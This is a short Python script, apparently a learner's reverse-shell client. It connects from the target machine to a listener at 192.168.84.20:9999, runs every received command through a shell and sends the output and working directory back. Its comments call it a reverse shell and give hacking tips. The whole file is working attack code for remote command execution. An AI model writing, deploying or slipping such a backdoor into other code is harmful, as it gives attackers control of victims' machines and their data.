import os
import socket
import subprocess

# Personal CPU's IPs are private and dynamic
# reverse shell, target connects to us
# this connects to the server

host = '192.168.84.20'
port = 9999 # don't choose a common one
s = socket.socket()
s.connect((host, port))

while True:
	data = s.recv(1024)
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8')) # use 3: to avoid space

	# if there is text, send to normal stream
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		# want string and byte for human and computer readability
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, 'utf-8')

		# returns command and cwd (Nice!)
		s.send(str.encode(output_str + str(os.getcwd()) + '> '))

		# prints on client machine, so don't do this if hacking
		print(output_str)

# close connection
s.close()

